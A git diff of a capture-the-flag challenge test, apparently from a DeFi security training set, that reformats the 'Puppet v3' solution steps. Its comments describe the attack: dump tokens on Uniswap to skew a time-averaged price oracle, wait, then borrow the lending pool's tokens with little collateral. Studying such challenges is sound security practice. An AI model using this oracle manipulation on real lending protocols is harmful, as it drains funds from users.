@@ -139,16 +139,28 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
+
         // There is not much liquidity on Uniswap
         // We can sell all our tokens on Uniswap to manipulate the price
         // Then we can borrow all the tokens from the lending pool with a small collateral
         // Difference from V2 is that now the price is time averaged
         // So we have to wait some time after selling the tokens
-        attacker = await (await ethers.getContractFactory('PuppetV3Attacker', player)).deploy(lendingPool.address);
-        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        attacker = await (await ethers.getContractFactory('PuppetV3Attacker', player)).deploy(
+            lendingPool.address
+        );
+
+        await token.connect(player).approve(
+            attacker.address, 
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
         await attacker.sellTokens();
+
         await time.increase(110);
+        
         await attacker.borrowTokens();
+
     });
 
     after(async function () {
